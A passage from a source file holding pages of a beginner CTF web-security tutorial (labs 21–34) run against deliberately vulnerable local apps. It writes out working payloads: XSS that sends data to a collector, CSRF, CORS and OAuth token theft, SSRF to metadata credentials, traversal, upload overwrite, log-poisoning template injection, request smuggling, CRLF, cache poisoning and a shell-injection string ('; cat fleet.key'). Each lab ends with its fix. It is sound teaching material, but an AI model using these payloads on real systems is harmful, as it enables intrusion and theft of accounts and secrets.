<p>The result contains <code>FLAG{reflected_xss_filter}</code>.</p>
<p>The fix is contextual output encoding and a well-tested HTML sanitizer—not a string replacement for one spelling of one tag. A strict Content Security Policy adds defense in depth.</p>
<h2 id="lab-21-stored-xss-against-an-httponly-cookie">Lab 21: stored XSS against an HttpOnly cookie</h2>
<p>Start the board lab:</p>
<pre><code class="language-bash">$ ./run.sh 21
$ h5i browser open 'http://127.0.0.1:9210/' \
  --session lab21 --new --capture
</code></pre>
<p>The moderator’s session cookie is <code>HttpOnly</code>, so JavaScript cannot read it through <code>document.cookie</code>. That protects the cookie from direct theft, but the browser still attaches it to same-origin requests.</p>
<p>Instead of reading the credential, ask the application for the flag and exfiltrate the response:</p>
<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
$ PAYLOAD=&quot;&lt;script&gt;fetch('/admin/api/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&quot;

$ h5i websec replay req_0 --session lab21 --create \
  --set method=POST --set path=/api/comment \
  --set header.Content-Type=application/json \
  --set json.who=anon --set &quot;json.body=$PAYLOAD&quot; \
  --set header.X-Board-Url=http://127.0.0.1:9210/board
</code></pre>
<p>When the moderator reviews the stored comment, the script runs with the board’s origin and the moderator’s session. Read the collector a few seconds later:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab21 --create \
  --set path=/collected --set &quot;query.id=$ID&quot;
</code></pre>
<p>The row is the percent-encoded body of <code>/admin/api/flag</code>, and it contains <code>FLAG{stored_xss_httponly}</code>.</p>
<p><code>HttpOnly</code> is valuable, but it does not stop XSS from acting as the victim. Preventing the injection remains essential.</p>
<h2 id="lab-22-csrf-without-seeing-the-cookie">Lab 22: CSRF without seeing the cookie</h2>
<p><strong>Cross-site request forgery</strong>, or <strong>CSRF</strong>, makes a victim’s browser send an authenticated request from an attacker-controlled page.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 22
$ h5i browser open 'http://127.0.0.1:9220/' \
  --session lab22 --new --capture
</code></pre>
<p>The recovery-email endpoint changes state through <code>GET</code> and requires no CSRF token. Host an attacker page on the lab’s second origin:</p>
<pre><code class="language-html">&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;
</code></pre>
<p>Publish it and ask the moderator bot to open it:</p>
<pre><code class="language-bash">$ PAGE='&lt;html&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;&lt;/body&gt;&lt;/html&gt;'

$ h5i websec replay req_0 --session lab22 --create \
  --set method=POST --set path=/page \
  --set header.Content-Type=application/json \
  --set json.name=trap --set &quot;json.html=$PAGE&quot;

$ h5i websec replay req_0 --session lab22 --create \
  --set method=POST --set path=/report \
  --set header.Content-Type=application/json \
  --set json.url=http://127.0.0.1:9221/p/trap
</code></pre>
<p>The browser loads the image from port 9220 and attaches the moderator’s matching cookie. Request <code>/account/reset</code> to obtain <code>FLAG{csrf_no_token}</code>.</p>
<p>State-changing operations should not use <code>GET</code>. Require an unpredictable CSRF token and validate <code>Origin</code> or <code>Referer</code>; use <code>SameSite</code> cookies as an additional barrier.</p>
<h2 id="lab-23-a-cors-check-that-ignores-the-port">Lab 23: a CORS check that ignores the port</h2>
<p>An <strong>origin</strong> consists of a scheme, host, and port. These are different origins:</p>
<pre><code class="language-text">http://127.0.0.1:9230
http://127.0.0.1:9231
</code></pre>
<p>Start the lab and test both an unrelated host and the attacker-controlled second port:</p>
<pre><code class="language-bash">$ ./run.sh 23
$ h5i browser open 'http://127.0.0.1:9230/' \
  --session lab23 --new --capture

$ h5i websec replay req_0 --session lab23 --create \
  --set path=/api/me \
  --set header.Origin=http://127.0.0.1:9231
</code></pre>
<p>The server reflects that origin in <code>Access-Control-Allow-Origin</code> and sets <code>Access-Control-Allow-Credentials: true</code>. Its allowlist is a prefix test against <code>http://127.0.0.1</code>, so it stops reading before the port and accepts every port on the machine.</p>
<p>Publish a page on port 9231 that reads <code>/api/me</code> with the victim’s cookies, and report it the same way as in Lab 22:</p>
<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
$ PAGE=&quot;&lt;html&gt;&lt;body&gt;&lt;script&gt;
fetch('http://127.0.0.1:9230/api/me',{credentials:'include'})
  .then(r=&gt;r.text())
  .then(t=&gt;fetch('http://127.0.0.1:9230/collect?id=$ID&amp;c='+encodeURIComponent(t)))
&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;

$ h5i websec replay req_0 --session lab23 --create \
  --set method=POST --set path=/page \
  --set header.Content-Type=application/json \
  --set json.name=steal --set &quot;json.html=$PAGE&quot;

$ h5i websec replay req_0 --session lab23 --create \
  --set method=POST --set path=/report \
  --set header.Content-Type=application/json \
  --set json.url=http://127.0.0.1:9231/p/steal
</code></pre>
<p>A signed-in user opens it, the page reads the credentialed response because the server agreed to the wrong origin, and the collector receives it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab23 --create \
  --set path=/collected --set &quot;query.id=$ID&quot;
</code></pre>
<p>The row is the percent-encoded body of <code>/api/me</code>, and it contains <code>FLAG{cors_origin_check}</code>.</p>
<p>CORS allowlists must compare parsed, normalized origins exactly. Never use prefix, suffix, substring, or hostname-only checks when credentials are allowed.</p>
<h2 id="lab-24-oauth-redirect-validation-as-a-string-bug">Lab 24: OAuth redirect validation as a string bug</h2>
<p>Start the SSO lab:</p>
<pre><code class="language-bash">$ ./run.sh 24
$ h5i browser open 'http://127.0.0.1:9240/' \
  --session lab24 --new --capture
</code></pre>
<p>The <code>notes</code> client has one registered callback:</p>
<pre><code class="language-text">http://127.0.0.1:9240/callback
</code></pre>
<p>The authorization server incorrectly checks only whether that text appears somewhere inside the supplied <code>redirect_uri</code>.</p>
<p>Create an attacker callback where the registered URL appears inside a query parameter:</p>
<pre><code class="language-text">http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback
</code></pre>
<p>URL-encode it and construct the authorization URL:</p>
<pre><code class="language-bash">$ EVIL='http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback'
$ ENCODED=$(python3 -c \
  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1],safe=&quot;&quot;))' &quot;$EVIL&quot;)
$ AUTH=&quot;http://127.0.0.1:9240/oauth/authorize?client_id=notes&amp;state=xyz&amp;redirect_uri=$ENCODED&quot;
</code></pre>
<p>Publish a callback page that records <code>location.search</code>, then send <code>$AUTH</code> to the signed-in victim through <code>/report</code>. The victim is redirected to the attacker page with an authorization code.</p>
<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
$ PAGE=&quot;&lt;script&gt;fetch('http://127.0.0.1:9240/collect?id=$ID&amp;c='+encodeURIComponent(location.search))&lt;/script&gt;&quot;

$ h5i websec replay req_0 --session lab24 --create \
  --set method=POST --set path=/page \
  --set header.Content-Type=application/json \
  --set json.name=callback --set &quot;json.html=$PAGE&quot;

$ h5i websec replay req_0 --session lab24 --create \
  --set method=POST --set path=/report \
  --set header.Content-Type=application/json \
  --set &quot;json.url=$AUTH&quot;
</code></pre>
<p>Read the collector, extract the <code>code</code> parameter, and exchange it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
  --set path=/collected --set &quot;query.id=$ID&quot;
</code></pre>
<p>The row looks like <code>?next=http://127.0.0.1:9240/callback&amp;code=&lt;hex&gt;&amp;state=xyz</code>.</p>
<pre><code class="language-bash">$ CODE='PASTE_AUTHORIZATION_CODE'
$ h5i websec replay req_0 --session lab24 --create \
  --set method=POST --set path=/oauth/token \
  --set header.Content-Type=application/json \
  --set &quot;json.code=$CODE&quot;
$ TOKEN='PASTE_ACCESS_TOKEN'
</code></pre>
<p>Call <code>/api/profile</code> with the access token:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
  --set path=/api/profile \
  --set &quot;header.Authorization=Bearer $TOKEN&quot;
</code></pre>
<p>The profile contains <code>FLAG{oauth_redirect_uri}</code>.</p>
<p>OAuth redirect URIs should be matched exactly after careful parsing. A registered URL appearing as a substring, subdomain, path fragment, or query value is not the registered destination.</p>
<h2 id="the-shared-browser-security-model">The shared browser-security model</h2>
<p>These labs used different standards, but the testing questions repeat:</p>
<ol>
<li>Can attacker-controlled text become executable HTML or JavaScript?</li>
<li>If a cookie cannot be read, can the browser still act with it?</li>
<li>Does a cross-origin check compare scheme, host, and port?</li>
<li>Does a redirect rule validate a destination or merely search a string?</li>
<li>What protected response can the victim’s browser read and send elsewhere?</li>
</ol>
<h2 id="summary">Summary</h2>
<p>Reflected and stored XSS gave code the victim’s origin. CSRF used the victim’s cookie without reading it. A partial CORS check exposed a credentialed response, and substring validation redirected an OAuth code to the wrong origin.</p>
<pre><code class="language-bash">$ for s in lab20 lab21 lab22 lab23 lab24; do
    h5i browser close --session &quot;$s&quot;
  done
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/ssrf-and-file-attacks/">SSRF and File Attacks</a>, we will make the server itself the client and combine SSRF, path traversal, uploads, and local file inclusion.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/20-reflected-xss-filter">Lab 20: Reflected XSS</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/21-stored-xss-httponly">Lab 21: Stored XSS</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/22-csrf-no-token">Lab 22: CSRF</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/23-cors-origin-check">Lab 23: CORS</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/24-oauth-redirect-uri">Lab 24: OAuth redirect URI</a></li>
</ul>""",
}


SSRF = {
    "section": "guides", "slug": "ssrf-and-file-attacks", "published": "2026-09-13",
    "eyebrow": "Tutorial 07 / Server-side", "time": "6 min",
    "tags": "SSRF &middot; Traversal &middot; LFI &middot; Labs 25&ndash;29",
    "title": "SSRF and File Attacks | h5i web security tutorial",
    "h1": "SSRF and File Attacks",
    "description": "A beginner-friendly CTF tutorial: make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
    "meta": "Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
    "deck": "A beginner-friendly CTF tutorial: make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
    "next": ("/guides/http-protocol-attacks/", "Next in the series", "HTTP Protocol Attacks", "Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, we used a victim’s browser to send authenticated requests. Labs 25–29 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> ask a related question:</p>
<blockquote>
<p>What can the application server reach, read, or write that we cannot?</p>
</blockquote>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test server-side request forgery, path traversal, upload destinations, and local file inclusion. The targets run locally and are deliberately vulnerable.</p>
<h2 id="lab-25-ssrf-to-an-internal-metadata-service">Lab 25: SSRF to an internal metadata service</h2>
<p><strong>Server-side request forgery</strong>, or <strong>SSRF</strong>, occurs when an application fetches a URL supplied by a user. The request originates from the server, so it may reach internal services unavailable to an external visitor.</p>
<p>Start the link-preview lab:</p>
<pre><code class="language-bash">$ ./run.sh 25
$ h5i browser open \
  'http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/' \
  --session lab25 --new --capture --allow 127.0.0.1
</code></pre>
<p>Port 9251 represents a cloud instance-metadata service. Walk its path:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab25 \
  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/

$ h5i websec replay req_0 --session lab25 \
  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/linkpreview-role
</code></pre>
<p>The second response contains <code>FLAG{ssrf_metadata}</code>.</p>
<p>The vulnerable application treats a user URL as a safe fetch destination. A defense must parse and resolve the hostname, reject private, loopback, link-local, and otherwise prohibited addresses, and connect to the exact checked IP. Redirects must be checked again.</p>
<h2 id="lab-26-one-address-several-spellings">Lab 26: one address, several spellings</h2>
<p>The next lab blocks strings including <code>localhost</code> and <code>127.0.0.1</code>:</p>
<pre><code class="language-bash">$ ./run.sh 26
$ h5i browser open 'http://127.0.0.1:9260/' \
  --session lab26 --new --capture
</code></pre>
<p>The resolver accepts other textual forms of the same loopback address. For example, <code>2130706433</code> is the integer representation of <code>127.0.0.1</code>.</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab26 --create \
  --set path=/api/test \
  --set query.url=http://2130706433:9261/ops/credentials
</code></pre>
<p>The internal service returns <code>FLAG{ssrf_filter_bypass}</code>.</p>
<p>Other parsers may accept shortened, octal, hexadecimal, or IPv6 forms. Maintaining a blocklist of spellings is therefore insufficient.</p>
<p>The safe sequence is:</p>
<ol>
<li>parse the URL;</li>
<li>resolve its hostname;</li>
<li>check every resolved address against the network policy;</li>
<li>connect to the checked address without resolving it again; and</li>
<li>repeat the process after every redirect.</li>
</ol>
<p>This also prevents DNS rebinding, where a hostname resolves to an allowed address during validation and an internal address during connection.</p>
<h2 id="lab-27-encoded-path-traversal">Lab 27: encoded path traversal</h2>
<p>Start the document viewer:</p>
<pre><code class="language-bash">$ ./run.sh 27
$ h5i browser open \
  'http://127.0.0.1:9270/download?file=welcome.md' \
  --session lab27 --new --capture
</code></pre>
<p>The application strips <code>../</code>, but decoding happens in multiple layers. Double-encode the traversal:</p>
<pre><code class="language-bash">$ UP='%252e%252e%252f'
</code></pre>
<p>A normal URL library may parse and reserialize the value before sending it. First record that behavior:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
  --set &quot;query.file=${UP}secret%252fflag.txt&quot;
</code></pre>
<p>Now place the exact bytes on the HTTP request line:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
  --raw-target &quot;/download?file=${UP}secret%252fflag.txt&quot;
</code></pre>
<p>The response contains <code>FLAG{path_traversal_encoded}</code>.</p>
<p><code>--raw-target</code> matters when the representation itself is the payload. It bypasses normal URL parsing for the request target while keeping the request in h5i’s policy and audit trail.</p>
<p>The server should decode once into a canonical form, resolve the path, and verify that the final path remains inside the permitted directory. Repeated string replacement is not path containment.</p>
<h2 id="lab-28-upload-outside-the-upload-directory">Lab 28: upload outside the upload directory</h2>
<p>The avatar service checks that uploaded bytes start with the JPEG magic number, but trusts the supplied filename.</p>
<pre><code class="language-bash">$ ./run.sh 28
$ h5i browser open 'http://127.0.0.1:9280/' \
  --session lab28 --new --capture
$ WORK=$(mktemp -d)
$ KEY=&quot;k-pwn-$$&quot;
</code></pre>
<p>Create a file that begins like a JPEG and then contains a key the application will parse:</p>
<pre><code class="language-bash">$ python3 - &quot;$WORK/poly.jpg&quot; &quot;$KEY&quot; &lt;&lt;'PY'
import sys

data = b&quot;\xff\xd8\xff\xe0&quot; + f&quot;\n{sys.argv[2]}\n&quot;.encode()
open(sys.argv[1], &quot;wb&quot;).write(data)
PY
</code></pre>
<p>Upload it with a filename that escapes into the configuration directory:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
  --set method=POST --set path=/api/avatar \
  --set-file &quot;multipart.file=$WORK/poly.jpg&quot; \
  --set multipart.file.filename=../config/trusted_keys.txt \
  --set multipart.file.content_type=image/jpeg
</code></pre>
<p>The application re-reads that file when checking admin keys. Supply ours:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
  --set path=/api/admin/flag \
  --set &quot;header.X-Api-Key=$KEY&quot;
</code></pre>
<p>The result contains <code>FLAG{upload_path_write}</code>.</p>
<p>Validating file contents answered “Is this a JPEG?” It never answered “Where may this file be written?” Generate storage names server-side, resolve the destination, enforce containment, and keep uploads away from code and configuration.</p>
<h2 id="lab-29-lfi-log-poisoning-and-template-execution">Lab 29: LFI, log poisoning, and template execution</h2>
<p>Start the wiki:</p>
<pre><code class="language-bash">$ ./run.sh 29
$ h5i browser open \
  'http://127.0.0.1:9290/view?page=home.md' \
  --session lab29 --new --capture
</code></pre>
<p>Request a missing page. Its error reveals that <code>access.log</code> sits next to the page directory:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
  --set query.page=nope
</code></pre>
<p>Every request writes its <code>User-Agent</code> into that log. Put a template expression there:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
  --set 'header.User-Agent={{page.__init__.__globals__[&quot;RELEASE_KEY&quot;]}}'
</code></pre>
<p>Finally, traverse from <code>pages/</code> to the log:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
  --set query.page=../access.log
</code></pre>
<p>The wiki includes the log and renders it as a template. The expression executes and returns <code>FLAG{lfi_log_poisoning}</code>.</p>
<p>No single input gave us a template upload. The chain combined:</p>
<ol>
<li><strong>local file inclusion</strong>, which reads a path outside the page directory;</li>
<li><strong>log poisoning</strong>, which places controlled text into an existing file; and</li>
<li><strong>server-side template injection</strong>, because included files are rendered.</li>
</ol>
<p>The fix must close each boundary: enforce path containment, encode or structure log fields, and never render arbitrary included files as templates.</p>
<h2 id="a-reusable-server-and-file-testing-method">A reusable server-and-file testing method</h2>
<p>For every server-side fetch, ask which networks and protocols the server can reach. For every file operation, separate three questions:</p>
<ul>
<li>Are the bytes allowed?</li>
<li>Is the destination allowed?</li>
<li>How will the file be interpreted later?</li>
</ul>
<p>Also confirm what actually reached the wire. Encoded traversal and protocol-level payloads frequently fail because the client normalized them before the server saw them.</p>
<h2 id="summary">Summary</h2>
<p>SSRF turned the server into an internal client. Alternative address notation bypassed a string filter. A raw encoded target survived normalization, an upload filename overwrote trusted configuration, and an access log became an executable template.</p>
<pre><code class="language-bash">$ for s in lab25 lab26 lab27 lab28 lab29; do
    h5i browser close --session &quot;$s&quot;
  done
$ rm -rf &quot;$WORK&quot;
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/http-protocol-attacks/">HTTP Protocol Attacks</a>, we will move below ordinary HTTP requests: desynchronization, injected headers, cache keys, and WebSocket frames.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/25-ssrf-metadata">Lab 25: SSRF to metadata</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/26-ssrf-filter-bypass">Lab 26: SSRF filter bypass</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/27-path-traversal-encoded">Lab 27: Encoded path traversal</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/28-upload-path-write">Lab 28: Upload path write</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/29-lfi-log-poisoning">Lab 29: LFI and log poisoning</a></li>
</ul>""",
}


PROTOCOL = {
    "section": "guides", "slug": "http-protocol-attacks", "published": "2026-09-15",
    "eyebrow": "Tutorial 08 / Protocol", "time": "7 min",
    "tags": "Smuggling &middot; CRLF &middot; Cache poisoning &middot; Labs 30&ndash;34",
    "title": "HTTP Protocol Attacks | h5i web security tutorial",
    "h1": "HTTP Protocol Attacks",
    "description": "A beginner-friendly CTF tutorial: control raw request framing, inject headers, poison shared caches, and test commands carried over WebSockets.",
    "meta": "Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.",
    "deck": "A beginner-friendly CTF tutorial: control raw request framing, inject headers, poison shared caches, and test commands carried over WebSockets.",
    "next": ("/guides/logic-time-and-crypto/", "Next in the series", "Business Logic, Time, and Crypto", "Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>Most earlier labs changed a parameter inside an ordinary HTTP request. Labs 30–34 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on the layers around it: where a request ends, how headers are constructed, which inputs define a cache entry, and what happens after a page upgrades to a WebSocket.</p>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to send exact request bytes and WebSocket frames while keeping them inside the same policy and audit trail.</p>
<p>These techniques can affect other users’ traffic. Use only the included local labs or systems where the rules of engagement explicitly permit them.</p>
<h2 id="lab-30-http-request-smuggling">Lab 30: HTTP request smuggling</h2>
<p>A reverse proxy and an application server must agree on where one request ends. If one uses <code>Content-Length</code> while the other uses <code>Transfer-Encoding</code>, the same bytes can describe different message boundaries.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 30
$ h5i browser open 'http://127.0.0.1:9300/health' \
  --session lab30 --new --capture
$ WORK=$(mktemp -d)
</code></pre>
<p>The edge blocks <code>/admin/*</code>. We will make it see one permitted <code>POST</code>, while the backend sees the end of that request followed by a second request to <code>/admin/flag</code>.</p>
<p>Create the exact wire message:</p>
<pre><code class="language-bash">$ python3 - 'http://127.0.0.1:9300' &quot;$WORK/desync.http&quot; &lt;&lt;'PY'
import sys
from urllib.parse import urlparse

host = urlparse(sys.argv[1]).netloc
smuggled = (
    f&quot;GET /admin/flag HTTP/1.1\r\n&quot;
    f&quot;Host: {host}\r\n\r\n&quot;
)
body = &quot;0\r\n\r\n&quot; + smuggled

outer = (
    f&quot;POST / HTTP/1.1\r\n&quot;
    f&quot;Host: {host}\r\n&quot;
    f&quot;Content-Type: text/plain\r\n&quot;
    f&quot;Content-Length: {len(body)}\r\n&quot;
    f&quot;Transfer-Encoding: chunked\r\n&quot;
    f&quot;\r\n&quot;
    f&quot;{body}&quot;
)

open(sys.argv[2], &quot;wb&quot;).write(outer.encode())
PY
</code></pre>
<p>Send the file without reconstructing its framing:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab30 \
  --raw-request &quot;$WORK/desync.http&quot;
</code></pre>
<p>The summary reports only the first response, <code>{"seen": "POST /"}</code>, because that is the one the proxy considers the answer to our request. Both responses arrived on the same connection, so read the stored message to see the second one. Use the <code>seq</code> the replay printed:</p>
<pre><code class="language-bash">$ h5i websec show res_1 --session lab30 --raw
</code></pre>
<p>Two HTTP responses appear back to back, and the second contains <code>FLAG{request_smuggling_clte}</code>. That second response is the whole finding: it is the answer to a request the edge never allowed and never saw.</p>
<p>This is a CL.TE desynchronization: the proxy trusts <code>Content-Length</code>; the backend trusts chunked encoding. Prevent it by rejecting ambiguous requests, normalizing framing once, and avoiding unsafe reuse of backend connections.</p>
<p><code>--raw-request</code> is deliberately different from ordinary replay. A normal HTTP client would recompute the very headers we need to test.</p>
<h2 id="lab-31-crlf-header-injection">Lab 31: CRLF header injection</h2>
<p>HTTP/1 headers are separated by carriage return and line feed bytes: CRLF, written <code>\r\n</code>. If an application inserts user input into a header without rejecting newlines, the value can end one header and begin another.</p>
<p>Start the report lab:</p>
<pre><code class="language-bash">$ ./run.sh 31
$ h5i browser open 'http://127.0.0.1:9310/' \
  --session lab31 --new --capture
</code></pre>
<p>The front end sends a report name to an internal service and appends <code>X-Role: guest</code>. Insert a new header and end the header block before the application’s own role:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab31 --create \
  --set method=POST --set path=/api/report \
  --set header.Content-Type=application/json \
  --set &quot;json.name=quarterly&quot;$'\r\n'&quot;X-Role: admin&quot;$'\r\n\r\n'
</code></pre>
<p>The internal parser sees <code>X-Role: admin</code>; the later guest header falls into the body. The response contains <code>FLAG{crlf_header_injection}</code>.</p>
<p>Reject CR and LF in values used to construct protocol headers. Prefer APIs that represent headers structurally and refuse invalid bytes rather than composing an HTTP message as text.</p>
<h2 id="lab-32-host-header-password-reset-poisoning">Lab 32: Host-header password-reset poisoning</h2>
<p>Applications often need to build an absolute password-reset URL. If the request’s <code>Host</code> header supplies the domain, an attacker can make the emailed link point somewhere else.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 32
$ h5i browser open 'http://127.0.0.1:9320/' \
  --session lab32 --new --capture --allow 127.0.0.1
</code></pre>
<p>Ask for an admin reset while changing the host to the lab’s collector:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
  --set method=POST --set path=/api/reset \
  --set header.Content-Type=application/json \
  --set header.Host=127.0.0.1:9321 \
  --set json.email=admin@acme.test
</code></pre>
<p>The simulated mailbox owner clicks the link, and the collector on port 9321 records the path it was sent to. Read it through the same session:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
  --set url=http://127.0.0.1:9321/seen \
  --set header.Host=127.0.0.1:9321
</code></pre>
<p>The body is <code>{"seen": ["/api/reset/use?token=&lt;hex&gt;", ...]}</code>. Extract that token and use it:</p>
<pre><code class="language-bash">$ TOKEN='PASTE_RESET_TOKEN'
$ h5i websec replay req_0 --session lab32 --create \
  --set path=/api/reset/use \
  --set &quot;query.token=$TOKEN&quot;
</code></pre>
<p>The response contains <code>FLAG{host_header_reset}</code>.</p>
<p>Generate security-sensitive absolute URLs from trusted configuration, not <code>Host</code>, <code>X-Forwarded-Host</code>, or similar client-controlled headers. At the edge, allowlist accepted hostnames.</p>
<h2 id="lab-33-poison-a-shared-cache">Lab 33: poison a shared cache</h2>
<p>A cache key decides which requests share a stored response. A poisoning opportunity exists when an input changes the response but is absent from that key.</p>
<p>Start the newsroom lab:</p>
<pre><code class="language-bash">$ ./run.sh 33
$ h5i browser open 'http://127.0.0.1:9330/' \
  --session lab33 --new --capture
$ ID=&quot;drop$$&quot;
</code></pre>
<p>The origin reflects <code>X-Forwarded-Host</code> into the homepage, but the cache keys only on the URL. Create an XSS payload:</p>
<pre><code class="language-bash">$ PAYLOAD=&quot;x\&quot;&gt;&lt;script&gt;fetch('/admin/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&lt;x y=\&quot;&quot;
</code></pre>
<p>A single attempt almost never wins. A cache hit never reaches the origin, so our response can only be stored during the moment the entry is expired. Keep repopulating it, and check the collector between rounds:</p>
<pre><code class="language-bash">$ for _ in $(seq 1 40); do
    h5i websec replay req_0 --session lab33 \
      --reset-budget --repeat 5 \
      --set path=/ \
      --set &quot;header.X-Forwarded-Host=$PAYLOAD&quot; &gt;/dev/null

    h5i websec replay req_0 --session lab33 --create \
      --reset-budget \
      --set path=/collected --set &quot;query.id=$ID&quot; |
      grep -q 'FLAG' &amp;&amp; break

    sleep 0.6
  done

$ h5i websec replay req_0 --session lab33 --create \
  --reset-budget \
  --set path=/collected --set &quot;query.id=$ID&quot;
</code></pre>
<p>When the attacker’s response becomes the cached <code>/</code> entry, the editor’s next reload receives and executes it, and the collector row contains <code>FLAG{cache_poisoning}</code>.</p>
<p>Test caches by finding inputs that satisfy both conditions:</p>
<ol>
<li>changing the input changes the origin response;</li>
<li>changing the input does not create a different cache entry.</li>
</ol>
<p>The cache and origin must agree on every response-varying input. Do not reflect forwarding headers without validation, and avoid caching personalized or executable responses.</p>
<h2 id="lab-34-command-injection-over-a-websocket">Lab 34: command injection over a WebSocket</h2>
<p>The visible page in Lab 34 is static. Its operations travel as JSON frames over a WebSocket, so an HTTP-only request history would miss the attack surface.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 34
$ h5i browser open 'http://127.0.0.1:9340/' \
  --session lab34 --new --capture --allow 127.0.0.1
</code></pre>
<p>Learn the frame format with a normal action:</p>
<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
  --session lab34 \
  --send '{&quot;action&quot;:&quot;status&quot;}'
</code></pre>
<p>The <code>ping</code> action interpolates its <code>host</code> field into a shell command. Add a second command:</p>
<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
  --session lab34 \
  --send '{&quot;action&quot;:&quot;ping&quot;,&quot;host&quot;:&quot;10.0.0.1; cat fleet.key&quot;}' \
  --wait-ms 3000
</code></pre>
<p>The returned frame contains <code>FLAG{websocket_injection}</code>.</p>
<p>WebSocket messages require the same authentication, authorization, schema validation, and injection defenses as HTTP endpoints. Use an argument array rather than a shell for <code>ping</code>, and validate the host as an IP address or hostname.</p>
<h2 id="a-reusable-protocol-testing-method">A reusable protocol-testing method</h2>
<p>Ask where two components may disagree:</p>
<ul>
<li>proxy versus backend request boundaries;</li>
<li>application text versus header structure;</li>
<li>origin response variation versus cache key;</li>
<li>HTTP-visible pages versus WebSocket-only operations.</li>
</ul>
<p>When bytes are the experiment, verify the sent message itself. <code>--raw-request</code> and <code>--raw-target</code> exist because helpful normalization can otherwise erase the payload before it reaches the target.</p>
<h2 id="summary">Summary</h2>
<p>Labs 30–34 moved beneath normal parameters. We desynchronized two HTTP parsers, injected a header using CRLF, poisoned a reset link through <code>Host</code>, placed executable content in a shared cache, and carried command injection through a WebSocket frame.</p>
<pre><code class="language-bash">$ for s in lab30 lab31 lab32 lab33 lab34; do
    h5i browser close --session &quot;$s&quot;
  done
$ rm -rf &quot;$WORK&quot;
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/logic-time-and-crypto/">Business Logic, Time, and Crypto</a>, we will test the rules around money, time, randomness, authentication state, and serialized objects.</p>
<h2 id="references">References</h2>
<ul>
